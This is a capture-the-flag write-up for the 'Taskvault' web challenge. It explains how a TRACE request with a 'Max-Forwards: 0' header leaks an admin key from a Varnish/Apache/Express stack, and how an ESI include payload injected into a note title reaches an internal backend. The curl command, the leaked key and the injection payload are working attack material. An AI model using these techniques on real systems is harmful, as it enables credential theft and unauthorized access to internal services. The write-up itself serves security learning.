---
title: "Taskvault"
excerpt: "Web, FCSC 2025"
coverImage: "https://ctftime.org/media/cache/35/81/35817b4272fa1b66cf3617ab4d4ab0c0.png"
date: "2024-04-23"
author:
  name: dolipr4necrypt0
  picture: "/assets/blog/authors/dolipr4necrypt0.png"
ogImage:
  url: "https://ctftime.org/media/cache/35/81/35817b4272fa1b66cf3617ab4d4ab0c0.png"
---

# **Bypassing Proxy to Get X-Admin-Key and ESI exploit**

In this CTF challenge, we need to access a backend on the host `give_me_the_flag`. The challenge is beind a reverse proxy and only accept the host `taskvault.fcsc.fr`, so we will need to use multiples vulnerabilities to access the restricted backend.

---

## **Overview of the Files**

The application has 3 services that interact with the request. We will not include the reverse proxy that is challenge is beind because it is not included in the source. But it should be noted that without this first reverse proxy the challenge is trivial because we can just access the host `give_me_the_flag``.

### **1. Varnish**

Varnish is used as a caching layer and can be configured to intercept and manipulate HTTP requests. Here's the relevant part of the Varnish configuration:

```vcl
sub vcl_backend_fetch {
    if (bereq.http.host == "give_me_the_flag") {
        set bereq.backend = flag_backend;
    } else {
        set bereq.backend = default;
    }
}

sub vcl_recv {
    if (req.url == "/" || req.url == "/favicon.jpeg") {
        set req.http.X-Admin-Key = "${ADMIN_KEY}";
    }
    return(pass);
}

sub vcl_backend_response {
    set beresp.do_esi = true;
}
```

We can see the redirection to the flag_backend for the host `give_me_the_flag`, the inclusion of `X-Admin-Key` in the headers of the request and the activation of ESI (Edge Side Includes) which can be used to include a page from the server. The `X-Admin-Key` will be important in the express application at the third layer.

### **2. Apache**

The `apache.conf` file configures an Apache server to forward requests to an Express application via a **ProxyPass**. The relevant part of the configuration looks like this:

```apache
<VirtualHost *:8000>
    TraceEnable on
    ProxyPass / http://taskvault-app:3000/
    ProxyPassReverse / http://taskvault-app:3000/
</VirtualHost>
```

It should be noted that the directive `TraceEnable on` is activated by default. So why include it ? Generally in a CTF, if something is there it's usefull. So it should be considered as a hint and that maybe the `TRACE` method will play an important role.

### **3. Express Application**

The Express app receives requests from Apache and implement some kind of note system. The first thing we see is this :

```javascript
app.use((req, res, next) => {
	const adminKey = req.headers["x-admin-key"];
	
	if (!adminKey || adminKey !== process.env.ADMIN_KEY) {
		return res.status(403).json({ error: "Unauthorized access" });
	}
	next();
});
```

So we can see that every request that doesn't have the header `X-Admin-Key` with the correct value will be rejected by the app, with "Unauthorized access". And this restriction is applied to the whole app, so we can't access anything unless Varnish passes the key, essentially on the root of the webserver.

---

## **Exploiting TRACE and Max-Forwards: 0**

### **What is TRACE?**

The `TRACE` method is an HTTP request method used to echo back the received request. When sent, the server returns the request message as the response body. It will allow us to see the header `X-Admin-Key` and unlock the whole app.

However, when we try to use the `TRACE` method. It is blocked by Express with a message "Cannot TRACE /".

I've spend a lot of time debugging in local and what I realised is that if you disable the directive `ProxyPass` then you can see the `X-Admin-Key` echoed back. So I searched, how can I bypass Express all together ? I was thinking maybe if I crash Express or if I can make a malformed request, maybe I can get the `TRACE` to execute. But unfortunatly this doesn't work.

### **What is Max-Forwards?**

After long research, I was thinking : Apache should have some kind of mechanism to prevent infinite recursion in the proxy. And that's when I found the header `Max-Forwards`.

This header is used in HTTP requests to specify the maximum number of proxies or hops the request can pass through before reaching its destination. Setting `Max-Forwards: 0` tells the proxy that it should **not forward** the request any further and should handle it locally.

And that's the breakthrough that we need. A magic header so that the request never hits the Express app.

### **Exploit**

The following `curl` command sends a `TRACE` request with `Max-Forwards: 0`:

```bash
curl -XTRACE https://taskvault.fcsc.fr/ -H "Max-Forwards: 0"
```

Here’s what happens:
- `-X TRACE` sends a `TRACE` request.
- `-H "Max-Forwards: 0"` ensures that the request isn’t forwarded beyond Apache.
- The Apache server processes the `TRACE` request and responds with the request headers, including the `X-Admin-Key`.

And here is the response with the `X-Admin-Key` :

```http
TRACE / HTTP/1.1
host: taskvault.fcsc.fr
user-agent: curl/8.11.1
accept: */*
max-forwards: 0
X-Forwarded-For: 51.77.135.65
Via: 1.1 taskvault-varnish (Varnish/7.6)
X-Admin-Key: 6d02ed57299292a47615254957d073cc75cc7855248684960946838c1f786081
X-Varnish: 3678791
```

This response contains the sensitive `X-Admin-Key`, which now can be used to authenticate further requests.

---

## **Final exploitation**

Once we have the `X-Admin-Key`, there is still a final step we need to access the host `give_me_the_flag`. We will need to use ESI that is used to cache some part of a page. Essentially, a tag `<esi:include src="http://give_me_the_flag/" />` will trigger a server side request to `http://give_me_the_flag`.

We still need to find a way to include this in the response from the express app so that varnish can process it. It shouldn't be difficult because the app is a note system.

A simple attempt to include the tag doesn't seems to work at first. After a better look at the EJS templates, we see that all the inputs are escaped except from the title inside an id tag:

```javascript
<h3 id="<%- note.title %>" class="text-xl font-bold text-gray-800 mb-2 mt-1"><%= note.title %></h3>
```

The first `note.title` with, the `<%-` openning tag, is not sanitized. But unfortunatly, there is some other code in the app that tries to sanitied this.

```
app.post("/backlog", requireAuth, (req, res) => {
	var { title, content } = req.body;
	title = title.replace(/[^ &-z]/g, "");

	userNotes[req.session.username].push({ title, content });
	res.redirect("/backlog");
});
```

We can see a regex that filters some caracters from the title but not all specials caracters. We can still use `<`, `>` and `'`. We will need to close the tag to somehow trick varnish into processing the ESI instruction. The final payload in the title is:

`x><esi:include src='http://give_me_the_flag/' />`

---

## **Conclusion**

We used a combination of the **TRACE** HTTP method and the **Max-Forwards: 0** header to bypass the proxy and reveal the sensitive `X-Admin-Key`. By sending the `TRACE` request directly to Apache, we were able to retrieve the `X-Admin-Key` from the response. The last step is essentially somekind of XSS escape and bypassing a bad regex.

---
